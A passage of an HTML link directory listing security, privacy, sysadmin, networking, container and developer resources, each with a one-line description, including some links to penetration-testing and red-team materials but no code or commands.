id=mobile-apps-scanners>Mobile apps scanners</a></h5><p><a href=https://www.immuniweb.com/mobile/><b>ImmuniWeb® Mobile App Scanner</b></a> - test security and privacy of mobile apps (iOS & Android).<br><a href=https://vulnerabilitytest.quixxi.com/><b>Quixxi</b></a> - free Mobile App Vulnerability Scanner for Android & iOS.<br><a href=https://www.ostorlab.co/scan/mobile/><b>Ostorlab</b></a> - analyzes mobile application to identify vulnerabilities and potential weaknesses.<br><h5><a class=header href=#private-search-engines id=private-search-engines>Private Search Engines</a></h5><p><a href=https://www.startpage.com/><b>Startpage</b></a> - the world's most private search engine.<br><a href=https://searx.me/><b>searX</b></a> - a privacy-respecting, hackable metasearch engine.<br><a href=https://darksearch.io/><b>darksearch</b></a> - the 1st real Dark Web search engine.<br><a href=https://www.qwant.com/><b>Qwant</b></a> - the search engine that respects your privacy.<br><h5><a class=header href=#secure-webmail-providers id=secure-webmail-providers>Secure Webmail Providers</a></h5><p><a href=https://countermail.com/><b>CounterMail</b></a> - is a secure and easy to use online email service, designed to provide maximum security and privacy.<br><a href=http://mail2tor.com/><b>Mail2Tor</b></a> - is a Tor Hidden Service that allows anyone to send and receive emails anonymously.<br><a href=https://tutanota.com/><b>Tutanota</b></a> - is the world's most secure email service and amazingly easy to use.<br><a href=https://protonmail.com/><b>Protonmail</b></a> - is the world's largest secure email service, developed by CERN and MIT scientists.<br><a href=https://www.startmail.com/en/><b>Startmail</b></a> - private & encrypted email made easy.<br><h5><a class=header href=#crypto id=crypto>Crypto</a></h5><p><a href=https://keybase.io/><b>Keybase</b></a> - it's open source and powered by public-key cryptography.<br><h5><a class=header href=#pgp-keyservers id=pgp-keyservers>PGP Keyservers</a></h5><p><a href=https://keyserver.ubuntu.com/><b>SKS OpenPGP Key server</b></a> - services for the SKS keyservers used by OpenPGP.<br><h4><a class=header href=#systemsservices-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa id=systemsservices-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>Systems/Services <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h5><a class=header href=#operating-systems id=operating-systems>Operating Systems</a></h5><p><a href=http://www.slackware.com/><b>Slackware</b></a> - the most "Unix-like" Linux distribution.<br><a href=https://www.openbsd.org/><b>OpenBSD</b></a> - multi-platform 4.4BSD-based UNIX-like operating system.<br><a href=https://hardenedbsd.org/><b>HardenedBSD</b></a> - HardenedBSD aims to implement innovative exploit mitigation and security solutions.<br><a href=https://www.kali.org/><b>Kali Linux</b></a> - Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments.<br><a href=https://www.parrotsec.org/><b>Parrot Security OS</b></a> - cyber security GNU/Linux environment.<br><a href=https://www.backbox.org/><b>Backbox Linux</b></a> - penetration test and security assessment oriented Ubuntu-based Linux distribution.<br><a href=https://blackarch.org/><b>BlackArch</b></a> - is an Arch Linux-based penetration testing distribution for penetration testers and security researchers.<br><a href=https://www.pentoo.ch/><b>Pentoo</b></a> - is a security-focused livecd based on Gentoo.<br><a href=https://securityonion.net/><b>Security Onion</b></a> - Linux distro for intrusion detection, enterprise security monitoring, and log management.<br><a href=https://tails.boum.org/><b>Tails</b></a> - is a live system that aims to preserve your privacy and anonymity.<br><h5><a class=header href=#https-services id=https-services>HTTP(s) Services</a></h5><p><a href=https://varnish-cache.org/><b>Varnish Cache</b></a> - HTTP accelerator designed for content-heavy dynamic web sites.<br><a href=https://nginx.org/><b>Nginx</b></a> - open source web and reverse proxy server that is similar to Apache, but very light weight.<br><a href=https://openresty.org/en/><b>OpenResty</b></a> - is a dynamic web platform based on NGINX and LuaJIT.<br><a href=https://github.com/alibaba/tengine><b>Tengine</b></a> - a distribution of Nginx with some advanced features.<br><a href=https://caddyserver.com/><b>Caddy Server</b></a> - is an open source, HTTP/2-enabled web server with HTTPS by default.<br><a href=https://www.haproxy.org/><b>HAProxy</b></a> - the reliable, high performance TCP/HTTP load balancer.<br><h5><a class=header href=#dns-services id=dns-services>DNS Services</a></h5><p><a href=https://nlnetlabs.nl/projects/unbound/about/><b>Unbound</b></a> - validating, recursive, and caching DNS resolver (with TLS).<br><a href=https://www.knot-resolver.cz/><b>Knot Resolver</b></a> - caching full resolver implementation, including both a resolver library and a daemon.<br><a href=https://www.powerdns.com/><b>PowerDNS</b></a> - is an open source authoritative DNS server, written in C++ and licensed under the GPL.<br><h5><a class=header href=#other-services id=other-services>Other Services</a></h5><p><a href=https://github.com/z3APA3A/3proxy><b>3proxy</b></a> - tiny free proxy server.<br><h5><a class=header href=#securityhardening id=securityhardening>Security/hardening</a></h5><p><a href=https://twitter.com/EmeraldOnion><b>Emerald Onion</b></a> - is a 501(c)(3) nonprofit organization and transit internet service provider (ISP) based in Seattle.<br><a href=https://github.com/pi-hole/pi-hole><b>pi-hole</b></a> - the Pi-hole® is a DNS sinkhole that protects your devices from unwanted content.<br><a href=https://github.com/stamparm/maltrail><b>maltrail</b></a> - malicious traffic detection system.<br><a href=https://github.com/Netflix/security_monkey><b>security_monkey</b></a> - monitors AWS, GCP, OpenStack, and GitHub orgs for assets and their changes over time.<br><a href=https://github.com/firecracker-microvm/firecracker><b>firecracker</b></a> - secure and fast microVMs for serverless computing.<br><a href=https://github.com/StreisandEffect/streisand><b>streisand</b></a> - sets up a new server running your choice of WireGuard, OpenSSH, OpenVPN, Shadowsocks, and more.<br><h4><a class=header href=#networks-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa id=networks-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>Networks <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h5><a class=header href=#tools id=tools>Tools</a></h5><p><a href=https://www.capanalysis.net/ca/><b>CapAnalysis</b></a> - web visual tool to analyze large amounts of captured network traffic (PCAP analyzer).<br><a href=https://github.com/digitalocean/netbox><b>netbox</b></a> - IP address management (IPAM) and data center infrastructure management (DCIM) tool.<br><h5><a class=header href=#labs id=labs>Labs</a></h5><p><a href=https://labs.networkreliability.engineering/><b>NRE Labs</b></a> - learn automation by doing it. Right now, right here, in your browser.<br><h5><a class=header href=#other-1 id=other-1>Other</a></h5><p><a href=https://ee.lbl.gov/><b>LBNL's Network Research Group</b></a> - home page of the Network Research Group (NRG); tools, talks, papers and more.<br><h4><a class=header href=#containersorchestration-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa id=containersorchestration-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>Containers/Orchestration <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h5><a class=header href=#cli-tools id=cli-tools>CLI Tools</a></h5><p><a href=https://github.com/google/gvisor><b>gvisor</b></a> - container runtime sandbox.<br><a href=https://github.com/bcicen/ctop><b>ctop</b></a> - top-like interface for container metrics.<br><a href=https://github.com/docker/docker-bench-security><b>docker-bench-security</b></a> - is a script that checks for dozens of common best-practices around deploying Docker.<br><h5><a class=header href=#web-tools id=web-tools>Web Tools</a></h5><p><a href=https://github.com/moby/moby><b>Moby</b></a> - a collaborative project for the container ecosystem to assemble container-based system.<br><a href=https://traefik.io/><b>Traefik</b></a> - open source reverse proxy/load balancer provides easier integration with Docker and Let's encrypt.<br><a href=https://github.com/Kong/kong><b>kong</b></a> - The Cloud-Native API Gateway.<br><a href=https://github.com/rancher/rancher><b>rancher</b></a> - complete container management platform.<br><a href=https://github.com/portainer/portainer><b>portainer</b></a> - making Docker management easy.<br><a href=https://github.com/jwilder/nginx-proxy><b>nginx-proxy</b></a> - automated nginx proxy for Docker containers using docker-gen.<br><h5><a class=header href=#manualstutorialsbest-practices id=manualstutorialsbest-practices>Manuals/Tutorials/Best Practices</a></h5><p><a href=https://github.com/wsargent/docker-cheat-sheet><b>docker-cheat-sheet</b></a> - a quick reference cheat sheet on Docker.<br><a href=https://github.com/veggiemonk/awesome-docker><b>awesome-docker</b></a> - a curated list of Docker resources and projects.<br><a href=https://github.com/yeasy/docker_practice><b>docker_practice</b></a> - learn and understand Docker technologies, with real DevOps practice!<br><a href=https://github.com/docker/labs><b>labs</b></a> - is a collection of tutorials for learning how to use Docker with various tools.<br><a href=https://github.com/jessfraz/dockerfiles><b>dockerfiles</b></a> - various Dockerfiles I use on the desktop and on servers.<br><a href=https://github.com/kelseyhightower/kubernetes-the-hard-way><b>kubernetes-the-hard-way</b></a> - bootstrap Kubernetes the hard way on Google Cloud Platform. No scripts.<br><a href=https://github.com/jamesward/kubernetes-the-easy-way><b>kubernetes-the-easy-way</b></a> - bootstrap Kubernetes the easy way on Google Cloud Platform. No scripts.<br><a href=https://github.com/dennyzhang/cheatsheet-kubernetes-A4><b>cheatsheet-kubernetes-A4</b></a> - Kubernetes CheatSheets in A4.<br><a href=https://github.com/kabachook/k8s-security><b>k8s-security</b></a> - kubernetes security notes and best practices.<br><a href=https://learnk8s.io/production-best-practices/><b>kubernetes-production-best-practices</b></a> - checklists with best-practices for production-ready Kubernetes.<br><a href=https://github.com/freach/kubernetes-security-best-practice><b>kubernetes-production-best-practices</b></a> - kubernetes security - best practice guide.<br><a href=https://github.com/hjacobs/kubernetes-failure-stories><b>kubernetes-failure-stories</b></a> - is a compilation of public failure/horror stories related to Kubernetes.<br><h4><a class=header href=#manualshowtostutorials-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa id=manualshowtostutorials-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>Manuals/Howtos/Tutorials <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h5><a class=header href=#shellcommand-line id=shellcommand-line>Shell/Command line</a></h5><p><a href=https://github.com/dylanaraps/pure-bash-bible><b>pure-bash-bible</b></a> - is a collection of pure bash alternatives to external processes.<br><a href=https://github.com/dylanaraps/pure-sh-bible><b>pure-sh-bible</b></a> - is a collection of pure POSIX sh alternatives to external processes.<br><a href=https://github.com/Idnan/bash-guide><b>bash-guide</b></a> - is a guide to learn bash.<br><a href=https://github.com/denysdovhan/bash-handbook><b>bash-handbook</b></a> - for those who wanna learn Bash.<br><a href=https://wiki.bash-hackers.org/start><b>The Bash Hackers Wiki</b></a> - hold documentation of any kind about GNU Bash.<br><a href=http://pubs.opengroup.org/onlinepubs/9699919799/utilities/contents.html><b>Shell & Utilities</b></a> - describes the commands and utilities offered to application programs by POSIX-conformant systems.<br><a href=https://github.com/jlevy/the-art-of-command-line><b>the-art-of-command-line</b></a> - master the command line, in one page.<br><a href=https://google.github.io/styleguide/shell.xml><b>Shell Style Guide</b></a> - a shell style guide for Google-originated open-source projects.<br><h5><a class=header href=#text-editors-2 id=text-editors-2>Text Editors</a></h5><p><a href=https://vim.rtorr.com/><b>Vim Cheat Sheet</b></a> - great multi language vim guide.<br><h5><a class=header href=#python id=python>Python</a></h5><p><a href=https://awesome-python.com/><b>Awesome Python</b></a> - a curated list of awesome Python frameworks, libraries, software and resources.<br><a href=https://github.com/gto76/python-cheatsheet><b>python-cheatsheet</b></a> - comprehensive Python cheatsheet.<br><a href=https://www.pythoncheatsheet.org/><b>pythoncheatsheet.org</b></a> - basic reference for beginner and advanced developers.<br><h5><a class=header href=#sed--awk--other id=sed--awk--other>Sed & Awk & Other</a></h5><p><a href="https://posts.specterops.io/fawk-yeah-advanced-sed-and-awk-usage-parsing-for-pentesters-3-e5727e11a8ad?gi=c8f9506b26b6"><b>F’Awk Yeah!</b></a> - advanced sed and awk usage (Parsing for Pentesters 3).<br><h5><a class=header href=#nix--network id=nix--network>*nix & Network</a></h5><p><a href=https://www.cyberciti.biz/><b>nixCraft</b></a> - linux and unix tutorials for new and seasoned sysadmin.<br><a href=https://www.tecmint.com/><b>TecMint</b></a> - the ideal Linux blog for Sysadmins & Geeks.<br><a href=http://www.omnisecu.com/index.php><b>Omnisecu</b></a> - free Networking, System Administration and Security tutorials.<br><a href=https://github.com/cirosantilli/linux-cheat><b>linux-cheat</b></a> - Linux tutorials and cheatsheets. Minimal examples. Mostly user-land CLI utilities.<br><a href=http://cb.vu/unixtoolbox.xhtml><b>Unix Toolbox</b></a> - collection of Unix/Linux/BSD commands and tasks which are useful for IT work or for advanced users.<br><a href=https://linuxguideandhints.com/><b>Linux Guide and Hints</b></a> - tutorials on system administration in Fedora and CentOS.<br><a href=https://github.com/NanXiao/strace-little-book><b>strace-little-book</b></a> - a little book which introduces strace.<br><a href=https://github.com/bagder/http2-explained><b>http2-explained</b></a> - a detailed document explaining and documenting HTTP/2.<br><a href=https://github.com/bagder/http3-explained><b>http3-explained</b></a> - a document describing the HTTP/3 and QUIC protocols.<br><a href=https://www.manning.com/books/http2-in-action><b>HTTP/2 in Action</b></a> - an excellent introduction to the new HTTP/2 standard.<br><a href=https://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/><b>Let's code a TCP/IP stack</b></a> - great stuff to learn network and system programming at a deeper level.<br><a href=https://github.com/trimstray/nginx-admins-handbook><b>Nginx Admin's Handbook</b></a> - describes how to improve NGINX performance, security and other important things.<br><a href=https://github.com/digitalocean/nginxconfig.io><b>nginxconfig.io</b></a> - NGINX config generator on steroids.<br><a href=https://infosec.mozilla.org/guidelines/openssh><b>openssh guideline</b></a> - is to help operational teams with the configuration of OpenSSH server and client.<br><a href=https://packetlife.net/><b>PacketLife.net</b></a> - a place to record notes while studying for Cisco's CCNP certification.<br><h5><a class=header href=#microsoft id=microsoft>Microsoft</a></h5><p><a href=https://github.com/infosecn1nja/AD-Attack-Defense><b>AD-Attack-Defense</b></a> - attack and defend active directory using modern post exploitation adversary tradecraft activity.<br><h5><a class=header href=#large-scale-systems id=large-scale-systems>Large-scale systems</a></h5><p><a href=https://github.com/donnemartin/system-design-primer><b>The System Design Primer</b></a> - learn how to design large-scale systems.<br><a href=https://github.com/binhnguyennus/awesome-scalability><b>Awesome Scalability</b></a> - best practices in building High Scalability, High Availability, High Stability and more.<br><a href="https://engineering.videoblocks.com/web-architecture-101-a3224e126947?gi=a896808d22a"><b>Web Architecture 101</b></a> - the basic architecture concepts.<br><h5><a class=header href=#system-hardening id=system-hardening>System hardening</a></h5><p><a href=https://www.cisecurity.org/cis-benchmarks/><b>CIS Benchmarks</b></a> - are secure configuration settings for over 100 technologies, available as a free PDF download.<br><a href=https://highon.coffee/blog/security-harden-centos-7/><b>Security Harden CentOS 7</b></a> - this walks you through the steps required to security harden CentOS.<br><a href=https://www.lisenet.com/2017/centos-7-server-hardening-guide/><b>CentOS 7 Server Hardening Guide</b></a> - great guide for hardening CentOS; familiar with OpenSCAP.<br><a href=https://github.com/decalage2/awesome-security-hardening><b>awesome-security-hardening</b></a> - is a collection of security hardening guides, tools and other resources.<br><a href=https://github.com/trimstray/the-practical-linux-hardening-guide><b>The Practical Linux Hardening Guide</b></a> - provides a high-level overview of hardening GNU/Linux systems.<br><h5><a class=header href=#security--privacy id=security--privacy>Security & Privacy</a></h5><p><a href=https://www.hackingarticles.in/><b>Hacking Articles</b></a> - LRaj Chandel's Security & Hacking Blog.<br><a href=https://github.com/toniblyx/my-arsenal-of-aws-security-tools><b>AWS security tools</b></a> - make your AWS cloud environment more secure.<br><a href=https://inventory.rawsec.ml/index.html><b>Rawsec's CyberSecurity Inventory</b></a> - an inventory of tools and resources about CyberSecurity.<br><a href=https://tls.ulfheim.net/><b>The Illustrated TLS Connection</b></a> - every byte of a TLS connection explained and reproduced.<br><a href=https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices><b>SSL Research</b></a> - SSL and TLS Deployment Best Practices by SSL Labs.<br><a href=http://selinuxgame.org/index.html><b>SELinux Game</b></a> - learn SELinux by doing. Solve Puzzles, show skillz.<br><a href=https://smallstep.com/blog/everything-pki.html><b>Certificates and PKI</b></a> - everything you should know about certificates and PKI but are too afraid to ask.<br><a href=https://appsecco.com/books/subdomain-enumeration/><b>The Art of Subdomain Enumeration</b></a> - a reference for subdomain enumeration techniques.<br><a href=https://lifehacker.com/the-comprehensive-guide-to-quitting-google-1830001964><b>Quitting Google</b></a> - the comprehensive guide to quitting Google.<br><h5><a class=header href=#web-apps id=web-apps>Web Apps</a></h5><p><a href=https://www.owasp.org/index.php/Main_Page><b>OWASP</b></a> - worldwide not-for-profit charitable organization focused on improving the security of software.<br><a href=https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project><b>OWASP ASVS 3.0.1</b></a> - OWASP Application Security Verification Standard Project.<br><a href=https://github.com/Santandersecurityresearch/asvs><b>OWASP ASVS 3.0.1 Web App</b></a> - simple web app that helps developers understand the ASVS requirements.<br><a href=https://github.com/OWASP/ASVS/tree/master/4.0><b>OWASP ASVS 4.0</b></a> - is a list of application security requirements or tests.<br><a href=https://www.owasp.org/index.php/OWASP_Testing_Project><b>OWASP Testing Guide v4</b></a> - includes a "best practice" penetration testing framework.<br><a href=https://github.com/OWASP/DevGuide><b>OWASP Dev Guide</b></a> - this is the development version of the OWASP Developer Guide.<br><a href=https://infosec.mozilla.org/guidelines/web_security.html><b>Mozilla Web Security</b></a> - help operational teams with creating secure web applications.<br><a href=https://github.com/Netflix/security-bulletins><b>security-bulletins</b></a> - security bulletins that relate to Netflix Open Source.<br><a href=https://github.com/shieldfy/API-Security-Checklist><b>API-Security-Checklist</b></a> - security countermeasures when designing, testing, and releasing your API.<br><a href=https://enable-cors.org/index.html><b>Enable CORS</b></a> - enable cross-origin resource sharing.<br><a href=https://appsecwiki.com/#/><b>Application Security Wiki</b></a> - is an initiative to provide all application security related resources at one place.<br><a href=https://github.com/GrrrDog/weird_proxies/wiki><b>Weird Proxies</b></a> - reverse proxy related attacks; it is a result of analysis of various reverse proxies, cache proxies, etc.<br><a href=https://dfir.it/blog/2015/08/12/webshell-every-time-the-same-purpose/><b>Webshells</b></a> - great series about malicious payloads.<br><a href=https://portswigger.net/blog/practical-web-cache-poisoning><b>Practical Web Cache Poisoning</b></a> - show you how to compromise websites by using esoteric web features.<br><a href=https://github.com/bl4de/research/tree/master/hidden_directories_leaks><b>Hidden directories and files</b></a> - as a source of sensitive information about web application.<br><a href=https://bo0om.ru/en/><b>Explosive blog</b></a> - great blog about cybersec and pentests.<br><a href=https://www.netsparker.com/security-cookies-whitepaper/><b>Security Cookies</b></a> - this paper will take a close look at cookie security.<br><a href=https://github.com/GitGuardian/APISecurityBestPractices><b>APISecurityBestPractices</b></a> - help you keep secrets (API keys, db credentials, certificates) out of source code.<br><h5><a class=header href=#all-in-one id=all-in-one>All-in-one</a></h5><p><a href=https://lzone.de/cheat-sheet/><b>LZone Cheat Sheets</b></a> - all cheat sheets.<br><a href=https://github.com/rstacruz/cheatsheets><b>Dan’s Cheat Sheets’s</b></a> - massive cheat sheets documentation.<br><a href=https://devhints.io/><b>Rico's cheatsheets</b></a> - this is a modest collection of cheatsheets.<br><a href=https://devdocs.io/><b>DevDocs API</b></a> - combines multiple API documentations in a fast, organized, and searchable interface.<br><h5><a class=header href=#other-2 id=other-2>Other</a></h5><p><a href=https://bitvijays.github.io/LFC-VulnerableMachines.html><b>CTF Series : Vulnerable Machines</b></a> - the steps below could be followed to find vulnerabilities and exploits.<br><a href=https://github.com/manoelt/50M_CTF_Writeup><b>50M_CTF_Writeup</b></a> - $50 million CTF from Hackerone - writeup.<br><a href=https://github.com/j00ru/ctf-tasks><b>ctf-tasks</b></a> - an archive of low-level CTF challenges developed over the years.<br><a href=https://hshrzd.wordpress.com/how-to-start/><b>How to start RE/malware analysis?</b></a> - collection of some hints and useful links for the beginners.<br><a href=http://www.kegel.com/c10k.html><b>The C10K problem</b></a> - it's time for web servers to handle ten thousand clients simultaneously, don't you think?<br><a href=http://poormansprofiler.org/><b>poor man's profiler</b></a> - sampling tools like dtrace's don't really provide methods to see what programs are blocking on.<br><a href=https://nickcraver.com/blog/2017/05/22/https-on-stack-overflow/><b>HTTPS on Stack Overflow</b></a> - this is the story of a long journey regarding the implementation of SSL.<br><a href=https://drawings.jvns.ca/><b>Julia's Drawings</b></a> - some drawings about programming and unix world, zines about systems & debugging tools.<br><a href=https://github.com/corkami/collisions><b>Hash collisions</b></a> - this great repository is focused on hash collisions exploitation.<br><a href=https://labs.ripe.net/Members/cteusche/bgp-meets-cat><b>BGP Meets Cat</b></a> - after 3072 hours of manipulating BGP, Job Snijders has succeeded in drawing a Nyancat.<br><a href=https://github.com/benjojo/bgp-battleships><b>bgp-battleships</b></a> - playing battleships over BGP.<br><a href=https://github.com/alex/what-happens-when><b>What happens when...</b></a> - you type google.com into your browser and press enter?<br><a href=https://github.com/vasanthk/how-web-works><b>how-web-works</b></a> - based on the 'What happens when...' repository.<br><a href=https://robertheaton.com/2018/11/28/https-in-the-real-world/><b>HTTPS in the real world</b></a> - great tutorial explain how HTTPS works in the real world.<br><a href=https://about.gitlab.com/2018/11/14/how-we-spent-two-weeks-hunting-an-nfs-bug/><b>Gitlab and NFS bug</b></a> - how we spent two weeks hunting an NFS bug in the Linux kernel.<br><a href=https://about.gitlab.com/2017/02/10/postmortem-of-database-outage-of-january-31/><b>Gitlab melts down</b></a> - postmortem on the database outage of January 31 2017 with the lessons we learned.<br><a href=http://www.catb.org/esr/faqs/hacker-howto.html><b>How To Become A Hacker</b></a> - if you want to be a hacker, keep reading.<br><a href=http://ithare.com/infographics-operation-costs-in-cpu-clock-cycles/><b>Operation Costs in CPU</b></a> - an infographics which should help to estimate costs of certain operations in CPU clocks.<br><a href=https://cstack.github.io/db_tutorial/><b>Let's Build a Simple Database</b></a> - writing a sqlite clone from scratch in C.<br><a href=https://djhworld.github.io/post/2019/05/21/i-dont-know-how-cpus-work-so-i-simulated-one-in-code/><b>simple-computer</b></a> - great resource to understand how computers work under the hood.<br><a href=https://www.troyhunt.com/working-with-154-million-records-on/><b>The story of "Have I been pwned?"</b></a> - working with 154 million records on Azure Table Storage.<br><a href=https://www.top500.org/><b>TOP500 Supercomputers</b></a> - shows the 500 most powerful commercially available computer systems known to us.<br><a href=https://www.shellntel.com/blog/2017/2/8/how-to-build-a-8-gpu-password-cracker><b>How to build a 8 GPU password cracker</b></a> - any "black magic" or hours of frustration like desktop components do.<br><a href=https://home.cern/science/computing><b>CERN Data Centre</b></a> - 3D visualizations of the CERN computing environments (and more).<br><a href=http://howfuckedismydatabase.com/><b>How fucked is my database</b></a> - evaluate how fucked your database is with this handy website.<br><a href=http://howfuckedismydatabase.com/><b>Five Whys</b></a> - you know what the problem is, but you cannot solve it?<br><a href=https://howhttps.works/><b>howhttps.works</b></a> - how HTTPS works ...in a comic!<br><a href=https://howdns.works/><b>howdns.works</b></a> - a fun and colorful explanation of how DNS works.<br><h4><a class=header href=#inspiring-lists-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa id=inspiring-lists-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>Inspiring Lists <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h5><a class=header href=#sysopsdevops id=sysopsdevops>SysOps/DevOps</a></h5><p><a href=https://github.com/kahun/awesome-sysadmin><b>Awesome Sysadmin</b></a> - amazingly awesome open source sysadmin resources.<br><a href=https://github.com/alebcay/awesome-shell><b>Awesome Shell</b></a> - awesome command-line frameworks, toolkits, guides and gizmos.<br><a href=https://github.com/learnbyexample/Command-line-text-processing><b>Command-line-text-processing</b></a> - from finding text to search and replace, from sorting to beautifying text and more.<br><a href=https://github.com/caesar0301/awesome-pcaptools><b>Awesome Pcaptools</b></a> - collection of tools developed by other researchers to process network traces.<br><a href=https://github.com/zoidbergwill/awesome-ebpf><b>awesome-ebpf</b></a> - a curated list of awesome projects related to eBPF.<br><a href=https://github.com/leandromoreira/linux-network-performance-parameters><b>Linux Network Performance</b></a> - learn where some of the network sysctl variables fit into the Linux/Kernel network flow.<br><a href=https://github.com/dhamaniasad/awesome-postgres><b>Awesome Postgres</b></a> - list of awesome PostgreSQL software, libraries, tools and resources.<br><a href=https://github.com/enochtangg/quick-SQL-cheatsheet><b>quick-SQL-cheatsheet</b></a> - a quick reminder of all SQL queries and examples on how to use them.<br><a href=https://github.com/Kickball/awesome-selfhosted><b>Awesome-Selfhosted</b></a> - list of Free Software network services and web applications which can be hosted locally.<br><a href=https://wiki.archlinux.org/index.php/List_of_applications><b>List of applications</b></a> - huge collection of applications sorted by category, as a reference for those looking for packages.<br><a href=https://github.com/InterviewMap/CS-Interview-Knowledge-Map><b>CS-Interview-Knowledge-Map</b></a> - build the best interview map.<br><a href=https://github.com/Tikam02/DevOps-Guide><b>DevOps-Guide</b></a> - DevOps Guide from basic to advanced with Interview Questions and Notes.<br><a href=https://github.com/bregman-arie/devops-interview-questions><b>devops-interview-questions</b></a> - contains interview questions on various DevOps and SRE related topics.<br><h5><a class=header href=#developers id=developers>Developers</a></h5><p><a href=https://github.com/kamranahmedse/developer-roadmap><b>Web Developer Roadmap</b></a> - roadmaps, articles and resources to help you choose your path, learn and improve.<br><a href=https://github.com/thedaviddias/Front-End-Checklist><b>Front-End-Checklist</b></a> - the perfect Front-End Checklist for modern websites and meticulous developers.<br><a href=https://github.com/thedaviddias/Front-End-Performance-Checklist><b>Front-End-Performance-Checklist</b></a> - the only Front-End Performance Checklist that runs faster than the others.<br><a href=https://rszalski.github.io/magicmethods/><b>Python's Magic Methods</b></a> - what are magic methods? They're everything in object-oriented Python.<br><a href=https://github.com/satwikkansal/wtfpython><b>wtfpython</b></a> - a collection of surprising Python snippets and lesser-known features.<br><a href=https://github.com/twhite96/js-dev-reads><b>js-dev-reads</b></a> - a list of books and articles for the discerning web developer to read.<br><a href=https://github.com/RomuloOliveira/commit-messages-guide><b>Commit messages guide</b></a> - a guide to understand the importance of commit messages.<br><h5><a class=header href=#securitypentesting id=securitypentesting>Security/Pentesting</a></h5><p><a href=https://github.com/qazbnm456/awesome-web-security><b>Awesome Web Security</b></a> - a curated list of Web Security materials and resources.<br><a href=https://github.com/joe-shenouda/awesome-cyber-skills><b>awesome-cyber-skills</b></a> - a curated list of hacking environments where you can train your cyber skills.<br><a href=https://github.com/devsecops/awesome-devsecops><b>awesome-devsecops</b></a> - an authoritative list of awesome devsecops tools.<br><a href=https://github.com/jivoi/awesome-osint><b>awesome-osint</b></a> - is a curated list of amazingly awesome OSINT.<br><a href=https://github.com/hslatman/awesome-threat-intelligence><b>awesome-threat-intelligence</b></a> - a curated list of Awesome Threat Intelligence resources.<br><a href=https://github.com/infosecn1nja/Red-Teaming-Toolkit><b>Red-Teaming-Toolkit</b></a> - a collection of open source and commercial tools that aid in red team operations.<br><a href=https://github.com/snoopysecurity/awesome-burp-extensions><b>awesome-burp-extensions</b></a> - a curated list of amazingly awesome Burp Extensions.<br><a href=https://github.com/Hack-with-Github/Free-Security-eBooks><b>Free Security eBooks</b></a> - list of a Free Security and Hacking eBooks.<br><a href=https://github.com/yeahhub/Hacking-Security-Ebooks><b>Hacking-Security-Ebooks</b></a> - top 100 Hacking & Security E-Books.<br><a href=https://github.com/wtsxDev/reverse-engineering><b>reverse-engineering</b></a> - list of awesome reverse engineering resources.<br><a href=https://github.com/michalmalik/linux-re-101><b>linux-re-101</b></a> - a collection of resources for linux reverse engineering.<br><a href=https://github.com/onethawt/reverseengineering-reading-list><b>reverseengineering-reading-list</b></a> - a list of Reverse Engineering articles, books, and papers.<br><a href=https://github.com/0xInfection/Awesome-WAF><b>Awesome-WAF</b></a> - a curated list of awesome web-app firewall (WAF) stuff.<br><a href=https://github.com/jakejarvis/awesome-shodan-queries><b>awesome-shodan-queries</b></a> - interesting, funny, and depressing search queries to plug into shodan.io.<br><a href=https://github.com/danielmiessler/RobotsDisallowed><b>RobotsDisallowed</b></a> - a curated list of the most common and most interesting robots.txt disallowed directories.<br><a href=https://github.com/Kayzaks/HackingNeuralNetworks><b>HackingNeuralNetworks</b></a> - is a small course on exploiting and defending neural networks.<br><a href=https://gist.github.com/joepie91/7e5cad8c0726fd6a5e90360a754fc568><b>wildcard-certificates</b></a> - why you probably shouldn't use a wildcard certificate.<br><a href=https://gist.github.com/joepie91/5a9909939e6ce7d09e29><b>Don't use VPN services</b></a> - which is what every third-party "VPN provider" does.<br><a href=https://github.com/InQuest/awesome-yara><b>awesome-yara</b></a> - a curated list of awesome YARA rules, tools, and people.<br><a href=https://github.com/drduh/macOS-Security-and-Privacy-Guide><b>macOS-Security-and-Privacy-Guide</b></a> - guide to securing and improving privacy on macOS.<br><a href=https://github.com/PaulSec/awesome-sec-talks><b>awesome-sec-talks</b></a> - is a collected list of awesome security talks.<br><a href=https://github.com/k4m4/movies-for-hackers><b>Movies for Hackers</b></a> - list of movies every hacker & cyberpunk must watch.<br><h5><a class=header href=#other-3 id=other-3>Other</a></h5><p><a href=https://www.cheatography.com/><b>Cheatography</b></a> - over 3,000 free cheat sheets, revision aids and quick references.<br><a href=https://github.com/mre/awesome-static-analysis><b>awesome-static-analysis</b></a> - static analysis tools for all programming languages.<br><a href=https://github.com/ossu/computer-science><b>computer-science</b></a> - path to a free self-taught education in Computer Science.<br><a href=https://github.com/danluu/post-mortems><b>post-mortems</b></a> - is a collection of postmortems (config errors, hardware failures, and more).<br><a href=https://github.com/danistefanovic/build-your-own-x><b>build-your-own-x</b></a> - build your own (insert technology here).<br><a href=https://github.com/rby90/Project-Based-Tutorials-in-C><b>Project-Based-Tutorials-in-C</b></a> - is a curated list of project-based tutorials in C.<br><a href=https://github.com/kylelobo/The-Documentation-Compendium><b>The-Documentation-Compendium</b></a> - various README templates & tips on writing high-quality documentation.<br><a href=https://github.com/mahmoud/awesome-python-applications><b>awesome-python-applications</b></a> - free software that works great, and also happens to be open-source Python.<br><h4><a class=header href=#blogspodcastsvideos-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa 